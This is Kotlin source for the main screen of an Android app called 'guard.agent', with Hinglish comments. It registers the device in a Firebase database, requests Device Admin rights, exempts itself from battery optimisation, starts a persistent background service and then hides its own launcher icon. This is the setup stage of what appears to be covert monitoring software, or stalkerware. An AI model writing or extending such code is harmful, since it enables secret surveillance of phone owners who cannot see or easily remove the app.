package com.guard.agent.ui

import android.app.admin.DevicePolicyManager
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.os.Build
import android.os.Bundle
import android.os.PowerManager
import android.provider.Settings
import android.widget.Button
import android.widget.TextView
import androidx.appcompat.app.AlertDialog
import androidx.appcompat.app.AppCompatActivity
import com.google.firebase.database.FirebaseDatabase
import com.guard.agent.R
import com.guard.agent.core.Constants
import com.guard.agent.core.DeviceKey
import com.guard.agent.core.PrefsManager
import com.guard.agent.receivers.AdminReceiver
import com.guard.agent.services.GuardService
import com.guard.agent.utils.PermissionUtils
import com.guard.agent.utils.getAndroidVersion
import com.guard.agent.utils.getDeviceModel
import com.guard.agent.utils.toast
import com.guard.agent.utils.toastLong

class MainActivity : AppCompatActivity() {

    private lateinit var dpm: DevicePolicyManager
    private lateinit var adminComp: ComponentName
    private lateinit var deviceKey: String

    private val REQ_ADMIN = 1002

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        dpm = getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
        adminComp = ComponentName(this, AdminReceiver::class.java)
        deviceKey = DeviceKey.get(this)

        val tvStatus = findViewById<TextView>(R.id.tvStatus)
        val tvKey = findViewById<TextView>(R.id.tvKey)
        val btnAdmin = findViewById<Button>(R.id.btnAdmin)
        val btnPerms = findViewById<Button>(R.id.btnPerms)
        val btnSetup = findViewById<Button>(R.id.btnSetup)
        val btnHide = findViewById<Button>(R.id.btnHide)

        tvStatus.text = getString(R.string.status_key_label)
        tvKey.text = deviceKey

        // Firebase mein device register karo
        registerDevice()

        // Agar setup already done hai toh status update
        if (PrefsManager.getBoolean(Constants.KEY_SETUP_DONE)) {
            tvStatus.text = "Setup complete ✓"
        }

        btnAdmin.setOnClickListener { enableAdmin() }
        btnPerms.setOnClickListener { openPermissionActivity() }
        btnSetup.setOnClickListener { openSetupWizard() }
        btnHide.setOnClickListener { confirmHideAndStart() }

        // Agar icon already hidden hai toh status update
        if (PrefsManager.getBoolean(Constants.KEY_ICON_HIDDEN)) {
            tvStatus.text = "Service running (icon hidden)"
        }
    }

    override fun onResume() {
        super.onResume()
        // Update admin status
        if (dpm.isAdminActive(adminComp)) {
            // Admin enabled
        }
    }

    /** Firebase mein device info push karo */
    private fun registerDevice() {
        try {
            val info = mapOf(
                "brand" to Build.BRAND,
                "model" to Build.MODEL,
                "manufacturer" to Build.MANUFACTURER,
                "device" to Build.DEVICE,
                "sdk" to Build.VERSION.SDK_INT,
                "androidVersion" to Build.VERSION.RELEASE,
                "deviceModel" to getDeviceModel(),
                "android" to getAndroidVersion(),
                "registeredAt" to System.currentTimeMillis()
            )
            FirebaseDatabase.getInstance().getReference(Constants.PATH_DEVICES)
                .child(deviceKey).child(Constants.SUB_INFO)
                .setValue(info)
        } catch (_: Exception) {}
    }

    /** Device Admin enable karo */
    private fun enableAdmin() {
        if (dpm.isAdminActive(adminComp)) {
            toast("Admin already enabled")
            return
        }
        val i = Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN).apply {
            putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, adminComp)
            putExtra(
                DevicePolicyManager.EXTRA_ADD_EXPLANATION,
                getString(R.string.admin_explanation)
            )
        }
        startActivityForResult(i, REQ_ADMIN)
    }

    /** Permission Activity kholo */
    private fun openPermissionActivity() {
        startActivity(Intent(this, PermissionActivity::class.java))
    }

    /** Setup Wizard kholo */
    private fun openSetupWizard() {
        startActivity(Intent(this, SetupActivity::class.java))
    }

    /** Confirm dialog + hide & start */
    private fun confirmHideAndStart() {
        val missing = PermissionUtils.getMissingSpecialPermissions(this)
        val msg = if (missing.isNotEmpty()) {
            "Ye permissions abhi bhi missing hain:\n\n• ${missing.joinToString("\n• ")}\n\n" +
                    "Phir bhi start karna chahta hai?"
        } else {
            getString(R.string.confirm_hide_msg, deviceKey)
        }

        AlertDialog.Builder(this)
            .setTitle(R.string.confirm_title)
            .setMessage(msg)
            .setPositiveButton(R.string.confirm_yes) { _, _ -> hideAndStart() }
            .setNegativeButton(R.string.confirm_no, null)
            .show()
    }

    /** Icon hide + service start */
    private fun hideAndStart() {
        // 1. Battery optimization ignore
        try {
            val pw = getSystemService(Context.POWER_SERVICE) as PowerManager
            if (!pw.isIgnoringBatteryOptimizations(packageName)) {
                @Suppress("BatteryLife")
                val i = Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS).apply {
                    data = android.net.Uri.parse("package:$packageName")
                }
                startActivity(i)
            }
        } catch (_: Exception) {}

        // 2. Service start karo
        val svc = Intent(this, GuardService::class.java)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(svc)
        } else {
            startService(svc)
        }

        // 3. Icon hide
        packageManager.setComponentEnabledSetting(
            ComponentName(this, MainActivity::class.java),
            android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
            android.content.pm.PackageManager.DONT_KILL_APP
        )

        // 4. Prefs mein save
        PrefsManager.putBoolean(Constants.KEY_ICON_HIDDEN, true)
        PrefsManager.putBoolean(Constants.KEY_SETUP_DONE, true)

        toastLong("Service started. Icon hidden.")
        finish()
    }

    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        super.onActivityResult(requestCode, resultCode, data)
        if (requestCode == REQ_ADMIN) {
            if (dpm.isAdminActive(adminComp)) {
                toast("Admin enabled ✓")
                try {
                    FirebaseDatabase.getInstance().getReference(Constants.PATH_DEVICES)
                        .child(deviceKey).child(Constants.SUB_ADMIN_ENABLED)
                        .setValue(true)
                } catch (_: Exception) {}
            } else {
                toast("Admin not enabled")
            }
        }
    }
}
